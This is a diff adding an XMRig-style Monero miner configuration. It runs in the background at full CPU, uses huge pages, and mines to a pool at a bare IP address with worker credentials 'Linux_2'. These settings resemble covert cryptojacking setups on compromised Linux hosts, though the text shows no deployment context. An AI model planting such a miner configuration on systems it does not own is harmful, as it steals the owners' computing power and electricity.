@@ -1,0 +1,38 @@
+{
+    "algo": "cryptonight",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "av": 0,
+    "background": true,
+    "colors": false,
+    "cpu-affinity": null,
+    "cpu-priority": 5,
+    "donate-level": 1,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 100,
+    "pools": [
+        {
+            "url": "185.164.72.119:3333",
+            "user": "Linux_2",
+            "pass": "Linux_2",
+            "keepalive": true,
+            "nicehash": true,
+            "variant": -1,
+            "tls": false,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": null
+}
